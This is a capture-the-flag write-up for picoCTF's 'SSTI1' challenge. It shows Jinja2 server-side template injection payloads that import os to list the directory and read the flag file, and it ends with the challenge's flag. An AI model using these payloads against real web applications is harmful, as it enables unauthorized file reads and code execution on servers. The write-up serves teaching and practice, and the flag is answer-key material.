# SSTI1
## Category: 
Web Exploitation

## Difficulty
easy

## Description
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website [link]!

##My approach

##step 1-First observation
First thing The page has an input field that reflects
user input directly on the page.This behavior is a red flag for SSTI,I tired to see if its vulnerable and what engine it is.

##step 2 -What i tried
>"{{4+4}}" to see if the input is controlled or not.
![the engine output](1.jpeg)
>"{{3*'3'}}" after confirming its vulnerable i need to see which engine this web use.
![the engine output](2.jpeg)
>"curl -I "target url""to get the header and also used it as Indicator of which engine.
![curl ouput](3.jpeg)
>"{{request.application.__globals__.__builtins__.__import__('os').listdir('.')}}" used to see the content of the current directory.
![payload output](4.jpeg)
>"{{request.application.__globals__.__builtins__.open('flag').read()}}"used to print out the content of the file flag in the current directory.

##step 3 -the solution
After finding out that the input is vulnerable and using the payloads above to see which engine and also executing some specific command like the content of the directories and also of the targeted file and there where the flag is found.


## Flag
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}

## What I learned
- Never trust user input in templates
- OWASP A03 - Injection
- Jinja2 detection : {{7*'7'}} → 7777777
- Always enumerate directory before reading files
- Debug endpoints expose file structure
